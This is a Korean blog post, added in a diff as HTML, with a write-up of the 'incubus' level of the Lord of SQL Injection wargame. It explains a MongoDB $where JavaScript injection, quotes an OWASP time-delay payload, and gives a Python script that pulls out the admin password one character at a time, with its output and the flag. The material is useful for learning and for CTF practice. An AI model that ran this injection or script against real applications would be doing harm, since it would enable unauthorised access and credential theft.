@@ -1,0 +1,570 @@
+<!DOCTYPE html>
+<html class="no-js">
+  <head>
+	<meta charset="utf-8">
+	<title>[Lord of SQL Injection] LoS - incubus 문제풀이 | mingzzi</title>
+	<meta name="description" content="드디어!!! 마지막 문제인 incubus이다.문제를 푼 시간보다 풀이를 적는 시간이 더 오래 걸렸던 것 같다..">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<!-- CSS -->
+	<link rel="stylesheet" href="/assets/css/main.css">
+
+	<!--Favicon-->
+	<link rel="shortcut icon" href="/assets/favicon.ico" type="image/x-icon">
+
+	<!-- Canonical -->
+	<link rel="canonical" href="/wargame/lord%20of%20sql%20injection/2019/08/07/los-incubus.html">
+
+	<!-- RSS -->
+	<link rel="alternate" type="application/atom+xml" title="mingzzi" href="/feed.xml" />
+
+	<!-- Font Awesome -->
+	<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+	<!-- Google Fonts -->
+	
+	<link href="https://fonts.googleapis.com/css?family=Nanum+Gothic:400,700" rel="stylesheet">
+	
+
+	<!-- KaTeX -->
+	
+	<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.css">
+	<script src="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.js"></script>
+	
+
+	<!-- Google Analytics -->
+	
+	<script>
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+	ga('create', 'UA-130304424-1', 'auto');
+	ga('send', 'pageview');
+	</script>
+	
+</head>
+
+  <header class="site-header">
+	<div class="branding">
+		
+		<a href="/">
+			<img class="avatar" src="/assets/img/blogmark.png" alt=""/>
+		</a>
+		
+		<h1 class="site-title">
+			<a href="/">mingzzi</a>
+		</h1>
+		<nav class="site-nav">
+				<ul>
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+							<li>
+								<a class="page-link" href="/about/">
+									About
+								</a>
+							</li>
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+							<li>
+								<a class="page-link" href="/tags.html">
+									tags
+								</a>
+							</li>
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+
+					<!-- Search bar -->
+					
+					<li>
+					<form action="/search.html" method="get">
+						<input type="text" id="search-box" name="query" placeholder="Search" class="">
+						<button type="submit" class="">
+							<i class="fa fa-fw fa-search"></i>
+						</button>
+					</form>
+					</li>
+					
+				</ul>
+		</nav>
+	</div>
+
+	<div class="site-category">
+			<ul class='cat1'>
+				<li><a href="/">Home</a></li>
+				<li><a href="/">Pentesting</a>
+					<ul>
+						<li><a href="/Pentest/iOS">iOS</a></li>
+						<li><a href="/Pentest/Android">Android</a></li>
+						<li><a href="/Pentest/PWeb">Web</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Wargame</a>
+					<ul>
+						<li><a href="/Wargame/LoS">Load of SQL Injection</a></li>
+						<li><a href="/Wargame/Pwnkr">Pwnable.kr</a></li>
+						<li><a href="/Wargame/Warkr">Wargame.kr</a></li>
+						<li><a href="/Wargame/XG">XSS Game</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">CTF</a>
+					<ul>
+						<li><a href="/CTF/2018">2018</a></li>
+						<li><a href="/CTF/2019">2019</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Error</a>
+					<ul>
+						<li><a href="/Error/Linux">Linux</a></li>
+						<li><a href="/Error/Python">Python</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Development</a>
+					<ul>
+						<li><a href="/Develop/Database">Database</a></li>
+						<li><a href="/Develop/Blog">Github Blog</a></li>
+						<li><a href="/Develop/DWeb">Web</a></li>
+						<li><a href="/Develop/Docker">Docker</a></li>
+						<li><a href="/Develop/Basic">Basic</a></li>
+					</ul>
+				</li>
+			</ul>
+		</div>
+
+</header>
+
+  <body>
+    <div class="content">
+      <article >
+  <header style="background-image: url('/')">
+    <h1 class="title">[Lord of SQL Injection] LoS - incubus 문제풀이</h1>
+    
+    <p class="meta">
+      August 7, 2019
+      
+    </p>
+  </header>
+  <section class="post-content"><p>드디어!!! 마지막 문제인 <code class="highlighter-rouge">incubus</code>이다.</p>
+
+<p>문제를 푼 시간보다 풀이를 적는 시간이 더 오래 걸렸던 것 같다..</p>
+
+<!--more-->
+
+<p>코드는 다음과 같다.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">--------------------------------------------------------------------------</span>
+<span class="nx">query</span> <span class="o">:</span> <span class="p">{</span><span class="s2">"</span><span class="nv">$where</span><span class="s2">"</span><span class="o">:</span><span class="s2">"function(){return obj.id==''&amp;&amp;obj.pw=='';}"</span><span class="p">}</span>
+<span class="o">--------------------------------------------------------------------------</span>
+
+<span class="o">&lt;?</span><span class="nx">php</span>
+  <span class="k">include</span> <span class="s2">"./config.php"</span><span class="p">;</span>
+  <span class="nx">login_chk</span><span class="p">();</span>
+  <span class="nv">$db</span> <span class="o">=</span> <span class="nx">mongodb_connect</span><span class="p">();</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/prob|_|\(/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"No Hack ~_~"</span><span class="p">);</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/prob|_|\(/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"No Hack ~_~"</span><span class="p">);</span>
+  <span class="nv">$query</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">"</span><span class="se">\$</span><span class="s2">where"</span> <span class="o">=&gt;</span> <span class="s2">"function(){return obj.id=='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="si">}</span><span class="s2">'&amp;&amp;obj.pw=='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]</span><span class="si">}</span><span class="s2">';}"</span><span class="p">);</span>
+  <span class="k">echo</span> <span class="s2">"&lt;hr&gt;query : &lt;strong&gt;"</span><span class="o">.</span><span class="nb">json_encode</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span><span class="o">.</span><span class="s2">"&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span><span class="p">;</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="nx">mongodb_fetch_array</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">prob_incubus</span><span class="o">-&gt;</span><span class="na">find</span><span class="p">(</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span> <span class="k">echo</span> <span class="s2">"&lt;h2&gt;Hello </span><span class="si">{</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;/h2&gt;"</span><span class="p">;</span>
+
+  <span class="nv">$query</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">"id"</span> <span class="o">=&gt;</span> <span class="s2">"admin"</span><span class="p">);</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="nx">mongodb_fetch_array</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">prob_incubus</span><span class="o">-&gt;</span><span class="na">find</span><span class="p">(</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">])</span> <span class="nx">solve</span><span class="p">(</span><span class="s2">"incubus"</span><span class="p">);</span>
+  <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>이번에도 <code class="highlighter-rouge">id</code>가 <code class="highlighter-rouge">admin</code>일 때의 <code class="highlighter-rouge">pw</code> 값을 알아야 한다.</p>
+
+<p>그런데 이번 문제에서는 조금 다른게 쿼리가 함수 형태로 들어갔다는 것이다.</p>
+
+<p>함수 형태로 들어가 있더라도, 내가 입력 한 값에 대해서는 특별한 검증이 없기 때문에 공격이 가능하다.</p>
+
+<p>내가 주로 고민했던 부분은 <code class="highlighter-rouge">obj.pw</code>에서 한 글자 씩을 어떻게 비교 할 것이냐는 부분이었다.</p>
+
+<p>그런데 여러가지 테스트를 해 보다가 <code class="highlighter-rouge">obj.pw[0]</code>과 같이 사용하면 한 글자 씩 사용할 수 있는 것을 확인할 수 있었다.</p>
+
+<p>일단 공격을 수행하기 위해서는 내가 의도한 코드를 실행시켜야 하는데, 여기에서는 <code class="highlighter-rouge">소스코드를 이어서 적는 방법</code>으로 함수의 흐름을 변경할 수 있다.</p>
+
+<p><code class="highlighter-rouge">소스코드를 이어서 적는 방법</code>이라고 하니 뭔가 이상한데, 예를 들면 이런 것이다.<br />
+<a href="https://www.owasp.org/index.php/Testing_for_NoSQL_injection#Example_1">Testing for NoSQL injection</a></p>
+
+<p>여기의 예시를 보면, 아래와 같은 코드가 있다.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">db</span><span class="p">.</span><span class="nx">myCollection</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span> <span class="p">{</span> <span class="na">active</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">$where</span><span class="p">:</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">credits</span> <span class="o">-</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">debits</span> <span class="o">&lt;</span> <span class="nx">$userInput</span><span class="p">;</span> <span class="p">}</span> <span class="p">}</span> <span class="p">);;</span>
+</code></pre></div></div>
+
+<p>이 때, <code class="highlighter-rouge">$userInput</code>에 대한 검증과정이 없다면 아래와 같은 코드를 <code class="highlighter-rouge">$userInput</code>으로 삽입하는 것이 가능하다.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="kd">function</span><span class="p">(){</span><span class="kd">var</span> <span class="nx">date</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">();</span> <span class="k">do</span><span class="p">{</span><span class="nx">curDate</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">();}</span><span class="k">while</span><span class="p">(</span><span class="nx">curDate</span><span class="o">-</span><span class="nx">date</span><span class="o">&lt;</span><span class="mi">10000</span><span class="p">);</span> <span class="k">return</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">();})()</span>
+</code></pre></div></div>
+
+<p>그 결과, 완성되는 코드는 다음과 같다.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span> <span class="p">()</span> <span class="p">{</span> <span class="k">return</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">credits</span> <span class="o">-</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">debits</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kd">function</span><span class="p">(){</span><span class="kd">var</span> <span class="nx">date</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">();</span> <span class="k">do</span><span class="p">{</span><span class="nx">curDate</span> <span class="o">=</span> <span class="k">new</span> <span class="nb">Date</span><span class="p">();}</span><span class="k">while</span><span class="p">(</span><span class="nx">curDate</span><span class="o">-</span><span class="nx">date</span><span class="o">&lt;</span><span class="mi">10000</span><span class="p">);</span> <span class="k">return</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">();})();</span> <span class="p">}</span>
+</code></pre></div></div>
+
+<p>즉, 입력 값에 내가 실행하고자 하는 소스코드를 입력하여 함수의 흐름을 바꾸는 것이다.</p>
+
+<p>나는 <code class="highlighter-rouge">id</code>가 <code class="highlighter-rouge">admin</code>일 때의 <code class="highlighter-rouge">pw</code> 값을 구해야 하므로, 실행되어야 하는 코드는 다음과 같은 형태여야 <code class="highlighter-rouge">pw</code>를 한 글자 씩 비교 해 전체 값을 알아낼 수 있다.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span><span class="p">(){</span><span class="k">return</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">id</span><span class="o">==</span><span class="s1">'admin'</span><span class="o">&amp;&amp;</span><span class="nx">obj</span><span class="p">.</span><span class="nx">pw</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="s1">'a'</span><span class="p">;}</span>
+</code></pre></div></div>
+
+<p>따라서 내가 입력 한 값은 다음과 같다.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">?</span><span class="nx">id</span><span class="o">=</span><span class="nx">admin</span><span class="s1">'&amp;&amp;obj.pw[0]='</span><span class="nx">a</span><span class="s1">';'</span>
+</code></pre></div></div>
+
+<p>이렇게 하면 <code class="highlighter-rouge">$query</code>에서 완성되는 코드는 다음과 같다.</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">function</span><span class="p">(){</span><span class="k">return</span> <span class="nx">obj</span><span class="p">.</span><span class="nx">id</span><span class="o">==</span><span class="s1">'admin'</span><span class="o">&amp;&amp;</span><span class="nx">obj</span><span class="p">.</span><span class="nx">pw</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="s1">'a'</span><span class="p">;</span><span class="s1">''</span><span class="o">&amp;&amp;</span><span class="nx">obj</span><span class="p">.</span><span class="nx">pw</span><span class="o">==</span><span class="s1">''</span><span class="p">;}</span>
+</code></pre></div></div>
+
+<p>만약 <code class="highlighter-rouge">obj.id</code>가 <code class="highlighter-rouge">admin</code>이고 <code class="highlighter-rouge">obj.pw</code>의  첫 번째 글자가 <code class="highlighter-rouge">a</code>라면 <code class="highlighter-rouge">return true</code>가 될 것이고, 뒤의 <code class="highlighter-rouge">''&amp;&amp;obj.pw=='';</code>는 별 다른 영향을 미치지 못할 것이다.</p>
+
+<p>이를 바탕으로 아래와 같이 코드를 구현했다.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">urllib2</span>
+<span class="kn">import</span> <span class="nn">urllib</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">time</span>
+
+<span class="n">flag</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">length</span> <span class="o">=</span> <span class="mi">40</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">"https://los.rubiya.kr/chall/incubus_3dff9ce783c9f574edf015a7b99450d7.php?id="</span>
+<span class="n">session</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">PHPSESSID</span> <span class="o">=</span> <span class="s">"YOUR SESSION ID"</span><span class="p">)</span>
+
+<span class="n">end</span> <span class="o">=</span> <span class="bp">False</span>
+
+<span class="k">print</span> <span class="s">"[+] Start"</span>
+
+<span class="k">print</span> <span class="s">"[+] Find password"</span>
+	
+<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">length</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
+	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">48</span><span class="p">,</span> <span class="mi">123</span><span class="p">):</span>
+		<span class="k">try</span><span class="p">:</span>
+			<span class="n">start</span> <span class="o">=</span> <span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">()</span>
+			<span class="n">query</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"admin'</span><span class="si">%26%26</span><span class="s">obj.pw["</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="o">+</span> <span class="s">"]=='"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="o">+</span> <span class="s">"';'"</span>
+			<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">session</span><span class="p">)</span>
+		<span class="k">except</span><span class="p">:</span>
+			<span class="k">print</span> <span class="s">"[-] Error occur"</span>
+			<span class="k">continue</span>
+
+		<span class="k">if</span> <span class="s">'Hello admin'</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+			<span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+			<span class="k">print</span> <span class="s">"[+] Found "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">j</span> <span class="o">+</span> <span class="mi">1</span><span class="p">),</span> <span class="s">":"</span><span class="p">,</span> <span class="n">flag</span>
+			<span class="k">break</span>
+		<span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">122</span><span class="p">:</span>
+			<span class="n">end</span> <span class="o">=</span> <span class="bp">True</span>
+			<span class="k">print</span> <span class="s">"[+] Maybe it's end of the password"</span>
+			<span class="k">break</span>
+	<span class="k">if</span> <span class="n">end</span><span class="p">:</span>
+		<span class="k">break</span>
+
+<span class="k">print</span> <span class="s">"[+] Found password : "</span><span class="p">,</span> <span class="n">flag</span>
+<span class="k">print</span> <span class="s">"[+] End"</span>
+</code></pre></div></div>
+
+<p>이를 실행하면 다음과 같다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python ex.py
+[+] Start
+[+] Find password
+[+] Found 1 : b
+[+] Found 2 : b4
+[+] Found 3 : b47
+[+] Found 4 : b478
+[+] Found 5 : b4782
+[+] Found 6 : b47822
+[+] Found 7 : b47822e
+[+] Found 8 : b47822ea
+[+] Maybe it's end of the password
+[+] Found password :  b47822ea
+[+] End
+</code></pre></div></div>
+
+<p>와 드디어 마지막 플래그 값을 얻었다!</p>
+
+<p>이를 아래와 같이 입력하면 문제를 풀 수 있다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?id=admin&amp;pw=b47822ea
+</code></pre></div></div>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-----------------------------------------------------------------------------------</span>
+<span class="nx">query</span> <span class="o">:</span> <span class="p">{</span><span class="s2">"</span><span class="nv">$where</span><span class="s2">"</span><span class="o">:</span><span class="s2">"function(){return obj.id==''&amp;&amp;obj.pw=='b47822ea';}"</span><span class="p">}</span>
+<span class="o">-----------------------------------------------------------------------------------</span>
+
+<span class="nx">INCUBUS</span> <span class="nx">Clear</span><span class="o">!</span>
+
+<span class="o">&lt;?</span><span class="nx">php</span>
+  <span class="k">include</span> <span class="s2">"./config.php"</span><span class="p">;</span>
+  <span class="nx">login_chk</span><span class="p">();</span>
+  <span class="nv">$db</span> <span class="o">=</span> <span class="nx">mongodb_connect</span><span class="p">();</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/prob|_|\(/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"No Hack ~_~"</span><span class="p">);</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/prob|_|\(/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"No Hack ~_~"</span><span class="p">);</span>
+  <span class="nv">$query</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">"</span><span class="se">\$</span><span class="s2">where"</span> <span class="o">=&gt;</span> <span class="s2">"function(){return obj.id=='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="si">}</span><span class="s2">'&amp;&amp;obj.pw=='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]</span><span class="si">}</span><span class="s2">';}"</span><span class="p">);</span>
+  <span class="k">echo</span> <span class="s2">"&lt;hr&gt;query : &lt;strong&gt;"</span><span class="o">.</span><span class="nb">json_encode</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span><span class="o">.</span><span class="s2">"&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span><span class="p">;</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="nx">mongodb_fetch_array</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">prob_incubus</span><span class="o">-&gt;</span><span class="na">find</span><span class="p">(</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span> <span class="k">echo</span> <span class="s2">"&lt;h2&gt;Hello </span><span class="si">{</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="si">}</span><span class="s2">&lt;/h2&gt;"</span><span class="p">;</span>
+
+  <span class="nv">$query</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">"id"</span> <span class="o">=&gt;</span> <span class="s2">"admin"</span><span class="p">);</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="nx">mongodb_fetch_array</span><span class="p">(</span><span class="nv">$db</span><span class="o">-&gt;</span><span class="na">prob_incubus</span><span class="o">-&gt;</span><span class="na">find</span><span class="p">(</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">])</span> <span class="nx">solve</span><span class="p">(</span><span class="s2">"incubus"</span><span class="p">);</span>
+  <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">INCUBUS Clear</code></p>
+
+<p>드디어 <code class="highlighter-rouge">Lord of SQL Injection</code>을 또 다시 <code class="highlighter-rouge">All Clear</code> 했다!</p>
+
+<p>너무 신난다 히히힣</p>
+
+<p>지난번에 풀 때에는 모르는게 좀 많아서 물어보면서 했었는데, 이번에는 퇴근하고 매일매일 혼자 풀어서 올클을 한 거라 더욱 뿌듯했다.</p>
+
+<p>이제는 다른 공부거리를 찾아봐야 겠다.</p>
+
+<p><code class="highlighter-rouge">Lord of SQL Injection All Clear!!</code></p>
+
+<p><img src="/images/los/incubus/incubus_01.png" alt="" /></p>
+</section>
+  
+<footer>
+  <div class="tags">
+    
+    <a class="tag" href="/tags#Write-up">#Write-up</a>
+    
+    <a class="tag" href="/tags#Lord of SQL Injection">#Lord of SQL Injection</a>
+    
+  </div>
+</footer>
+
+
+</article>
+<!-- Disqus -->
+<a href="https://devYurim.github.io/wargame/lord%20of%20sql%20injection/2019/08/07/los-incubus.html#disqus_thread"></a>
+
+<div class="comments">
+  
+<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://https-devyurim-github-io-1.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                            
+
+</div>
+
+
+<!-- Post navigation -->
+
+  <div id="post-nav">
+  
+  <div id="previous-post" class="post-nav-post">
+      <p>Previous post</p>
+      <a href="/wargame/lord%20of%20sql%20injection/2019/08/06/los-siren.html">
+        [Lord of SQL Injection] LoS - siren 문제풀이
+      </a>
+  </div>
+  
+  
+  <div id="next-post" class="post-nav-post">
+      <p>Next post</p>
+      <a href="/ctf/2019/2019/10/15/ctf-cce2019.html">
+        [CCE2019] hwp Write up
+      </a>
+  </div>
+  
+</div>
+
+
+
+    </div>
+    
+<script src="/assets/js/katex_init.js"></script>
+
+
+
+<footer class="site-footer">
+	<p class="text">Powered by <a href="https://jekyllrb.com/">Jekyll</a> with <a href="https://github.com/rohanchandra/type-theme">Type Theme</a>
+</p>
+</footer>
+
+
+    <script id="dsq-count-scr" src="//.disqus.com/count.js" async></script>
+
+    <!-- Google Analytics Tracking code -->
+<script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', '']);
+    _gaq.push(['_trackPageview']);
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+</script>
+
+  </body>
+</html>
